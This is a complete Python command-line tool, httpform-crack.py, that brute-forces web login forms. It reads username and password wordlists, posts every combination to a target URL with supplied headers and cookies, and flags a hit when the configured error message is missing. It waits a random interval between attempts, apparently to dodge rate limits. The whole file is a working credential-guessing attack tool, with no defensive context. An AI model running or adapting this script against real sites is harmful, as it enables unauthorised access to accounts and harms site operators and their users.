#!/usr/bin/env python3


'''
    usage: httpform-crack.py -u [url] -c [cookies] -U [users_file] -P [passwords_file]
'''


import time
import random
import requests
import json

from argparse import ArgumentParser


def config_from_cmdline():

    config = {}

    parser = ArgumentParser()

    parser.add_argument("-b", "--bodyfmt", type=str)
    parser.add_argument("-c", "--cookies", type=str)
    parser.add_argument("-e", "--errormsg", type=str)
    parser.add_argument("-H", "--header", type=str)
    parser.add_argument("-m", "--minwait", type=str)
    parser.add_argument("-M", "--maxwait", type=str)
    parser.add_argument("-P", "--passwords", type=str)
    parser.add_argument("-u", "--url", type=str)
    parser.add_argument("-U", "--users", type=str)

    args = parser.parse_args()

    config["bodyfmt"] = args.bodyfmt
    config["cookies"] = args.cookies
    config["error_msg"] = args.errormsg
    config["header"] = args.header
    config["min_wait"] = float(args.minwait)
    config["max_wait"] = float(args.maxwait)
    config["passwords_file"] = args.passwords
    config["url"] = args.url
    config["users_file"] = args.users

    return config


def cookies_cmdln_to_json(cookiesCmdln):
   
    cookiesJson = {}
   
    if cookiesCmdln:

	    for cookie in cookiesCmdln.split(" "):
	     
	        key, value = cookie.split("=")
	
	        value = value[:len(value) - 1] if value[len(value) - 1] == ";" else value
	        
	        cookiesJson[key] = value
	
    return cookiesJson


def file_to_list(fileName):

    lines = []

    with open(fileName) as file:

        for line in file:
            lines.append(line.strip())

    return lines


def main():

   config = config_from_cmdline()
   
   USERS_FILE = config["users_file"]
   
   PASSWORDS_FILE = config["passwords_file"]
   
   URL = config["url"]
   
   COOKIES = cookies_cmdln_to_json(config["cookies"])
   
   HEADERS = json.loads(config["header"])
   
   BODY = config["bodyfmt"]

   ERROR_MSG = config["error_msg"]

   MIN_WAIT = config["min_wait"]

   MAX_WAIT = config["max_wait"]
   
   users = file_to_list(USERS_FILE)
   
   passwords = file_to_list(PASSWORDS_FILE)
   
   attempts = 0

   for user in users:
   
       for passwd in passwords:
       
           data = BODY.replace("^USER^", user).replace("^PASS^", passwd)
           
           response = requests.post(
               url=URL, 
               headers=HEADERS, 
               data=data,
               cookies=COOKIES
           )
           
           if ERROR_MSG not in response.text:
              print(f"[{attempts}] \033[92mUser: {user} Password: {passwd} Status: {response.status_code}\033[0m")
           else:
              print(f"[{attempts}] \033[91mUser: {user} Password: {passwd} Status: {response.status_code}\033[0m")

           waitTime = random.uniform(MIN_WAIT, MAX_WAIT)

           time.sleep(waitTime)

           attempts += 1


if __name__ == "__main__":

	main()

